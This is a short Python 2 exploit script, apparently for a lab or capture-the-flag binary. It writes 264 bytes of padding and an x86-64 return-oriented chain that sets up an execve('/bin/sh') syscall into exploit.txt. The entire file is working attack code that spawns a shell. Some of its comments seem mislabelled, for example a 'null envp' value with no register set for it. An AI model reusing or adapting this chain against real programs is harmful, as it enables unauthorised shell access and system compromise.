#!/usr/bin/env python2

from struct import *
buf = ''
buf += 'A'*264 # junk
buf += pack('<Q',0x004005a3) # pop rdi
buf += pack('<Q',0x7ffff7b9d359) # point to /bin/sh
buf += pack('<Q',0x004005a1) # pop rsi
buf += pack('<Q',0x0) # null argv
buf += pack('<Q',0xffffdeadbeef) # junk
buf += pack('<Q',0x7ffff7be32d8) # pop rax
buf += pack('<Q',0x3b) # execve number
buf += pack('<Q',0x0) # null envp
buf += pack('<Q',0xffffffffabcd) # trash
buf += pack('<Q',0x7ffff7b5b050) # syscall
f = open("exploit.txt", "w")
f.write(buf)
f.close
